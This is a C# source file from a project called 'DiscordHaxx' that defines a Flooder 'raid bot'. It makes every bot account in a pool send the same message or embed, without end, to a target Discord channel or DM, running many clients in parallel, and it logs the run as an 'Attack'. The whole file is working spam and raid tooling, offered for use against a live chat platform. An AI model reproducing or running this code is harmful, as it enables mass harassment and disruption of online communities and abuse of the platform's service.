using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;

namespace DiscordHaxx
{
    public class Flooder : RaidBot
    {
        private readonly FloodRequest _request;
        private readonly List<FloodClient> _clients;
        private bool _ready;

        public Flooder(FloodRequest request)
        {
            Attack = new Attack(this) { Type = "Flooder", Bots = Server.Bots.Count };

            Threads = request.Threads;
            _request = request;

            if (string.IsNullOrWhiteSpace(_request.Message))
                throw new CheckException("Cannot send empty messages");

            if (_request.ChannelId <= 0)
                throw new CheckException("Invalid channel ID");

            _clients = new List<FloodClient>();

            if (request.DM)
            {
                Task.Run(() =>
                {
                    foreach (var bot in new List<RaidBotClient>(Server.Bots))
                    {
                        if (ShouldStop)
                            break;

                        try
                        {
                            _clients.Add(new FloodClient(bot, request.ChannelId, true));
                        }
                        catch { }
                    }

                    _ready = true;
                });
            }
            else
            {
                foreach (var bot in Server.Bots)
                    _clients.Add(new FloodClient(bot, request.ChannelId, false));

                _ready = true;
            }
        }


        public override void Start()
        {
            while (!_ready) { Thread.Sleep(200); }

            while (true)
            {
                if (ShouldStop)
                    break;

                Parallel.ForEach(new List<FloodClient>(_clients), new ParallelOptions() { MaxDegreeOfParallelism = _request.Threads }, bot =>
                {
                    if (ShouldStop)
                        return;

                    if (!bot.TrySendMessage(_request.Message, _request.UseEmbed ? _request.Embed : null))
                        _clients.Remove(bot);
                });


                if (_clients.Count == 0)
                    break;
            }

            Server.OngoingAttacks.Remove(Attack);
        }
    }
}
